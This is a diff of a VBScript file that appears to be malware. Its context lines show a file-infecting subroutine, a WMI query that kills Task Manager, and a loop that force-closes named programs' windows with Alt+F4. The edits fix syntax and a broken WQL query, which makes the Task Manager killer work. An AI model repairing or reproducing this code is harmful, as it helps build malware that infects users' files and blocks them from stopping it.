@@ -60,7 +60,7 @@ Sub InfectFiles(folder)
                 ' Close the file
                 objFile.Close
             End If
-            On Error Goto 0 ' Reset error handling
+            On Error GoTo 0 ' Reset error handling
         End If
     Next
 
@@ -87,27 +87,27 @@ End Function
 ' Check if Task Manager is running, and if so, close it
 On Error Resume Next
 Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
-Set colProcessList = objWmi.ExecQuery("Select * from Win32_ProcessWhere Name = 'taskmgr.exe'")
+Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
 If colProcessList.Count > 0 Then
 For Each objProcess In colProcessList
 objProcess.Terminate()
 Next
 End If
-On Error Goto 0 ' Reset error handling
+On Error GoTo 0 ' Reset error handling
 
 Do
 For Each strExeName In strExeNames
 On Error Resume Next
 Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\.\root\cimv2")
 Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
-    If colProcessList.Count > 0 Then
+            If colProcessList.Count > 0 Then
         For Each objProcess In colProcessList
             WshShell.AppActivate objProcess.ProcessId
             WScript.Sleep 0 ' Wait for window to activate before closing
             WshShell.SendKeys "%{F4}" ' Sends Alt+F4 to close window
         Next
     End If
-    On Error Goto 0 ' Reset error handling
+    On Error GoTo 0 ' Reset error handling
 Next
 
 ' Type "n" into the search bar with focus
